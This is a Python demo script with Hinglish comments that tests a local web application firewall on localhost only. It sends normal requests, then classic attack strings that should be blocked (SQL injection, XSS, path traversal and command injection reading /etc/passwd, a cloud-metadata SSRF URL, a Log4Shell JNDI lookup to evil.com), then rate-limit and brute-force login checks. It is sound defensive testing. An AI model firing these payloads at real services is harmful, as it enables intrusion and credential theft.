"""
Live demo:  (pehle ek terminal me `python run.py`, phir dusre me) python demo.py

Ye script SIRF tumhare apne computer (localhost) par chalta hai -- safety ke liye
kisi aur address par chalne se mana kar deta hai.
Demo ke baad tumhara IP 60 second ke liye BAN ho jaata hai (brute-force detect hua) --
ye feature hai, bug nahi. Dashboard tab bhi khulta rahega.
"""
import sys
import time
import urllib.parse
import urllib.request
from urllib.error import HTTPError, URLError

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
if urllib.parse.urlparse(BASE).hostname not in ("127.0.0.1", "localhost", "::1"):
    sys.exit("Safety: ye demo sirf localhost par chalta hai. Dusre kisi address par test mat karo.")


def call(method, path, params=None, form=None):
    url = BASE + path + ("?" + urllib.parse.urlencode(params) if params else "")
    data = urllib.parse.urlencode(form).encode() if form else None
    req = urllib.request.Request(url, data=data, method=method, headers={"User-Agent": "Mozilla/5.0 (sentinel-demo)"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except HTTPError as e:
        return e.code
    except URLError:
        sys.exit("Server nahi mila. Pehle dusre terminal me `python run.py` chalao.")


def show(title, got, expected):
    mark = "OK  " if got == expected else "DIFF"
    print(f"  [{mark}] {title:<52} -> {got}  (expected {expected})")


print("1) Legitimate Enterprise Traffic (sab 200 aane chahiye)")
show("corporate overview page", call("GET", "/"), 200)
show("ERP module specifications", call("GET", "/product", {"id": 2}), 200)
show("search directory 'notebook cluster'", call("GET", "/search", {"q": "notebook"}), 200)
show("IAM login with valid credentials", call("POST", "/login", form={"username": "demo", "password": "demo123"}), 200)

print("\n2) Attacks (sab 403 aane chahiye)")
show("SQL injection  ' OR 1=1 --", call("GET", "/search", {"q": "' OR 1=1 --"}), 403)
show("XSS  <script>alert(1)</script>", call("GET", "/search", {"q": "<script>alert(1)</script>"}), 403)
show("Path traversal  ../../etc/passwd", call("GET", "/product", {"id": "../../etc/passwd"}), 403)
show("Command injection  ; cat /etc/passwd", call("GET", "/search", {"q": "; cat /etc/passwd"}), 403)
show("SSRF cloud metadata  169.254.169.254", call("GET", "/search", {"q": "http://169.254.169.254/latest/meta-data/"}), 403)
show("Log4Shell  ${jndi:ldap://evil.com/x}", call("GET", "/search", {"q": "${jndi:ldap://evil.com/x}"}), 403)
show("Null byte injection  file%00.php", call("GET", "/search", {"q": "file%00.php"}), 403)

print("\n3) Bahut zyada requests (kuch 429 aane chahiye)")
codes = [call("GET", "/about") for _ in range(30)]
print(f"  30 requests jaldi-jaldi: {codes.count(200)} x 200, {codes.count(429)} x 429 (rate limited)")
print("  (rate window saaf hone ke liye 11 second ruk rahe hain ...)")
time.sleep(11)

print("\n4) Brute force: 7 galat login (pehle 5 -> 401, uske baad 403 aur IP ban)")
codes = [call("POST", "/login", form={"username": "demo", "password": f"wrong{i}"}) for i in range(7)]
print(f"  status codes: {codes}")
show("ab sahi password bhi (IP banned hai)", call("POST", "/login", form={"username": "demo", "password": "demo123"}), 403)

print("\nDashboard dekho: http://127.0.0.1:5000/sentinel/dashboard")
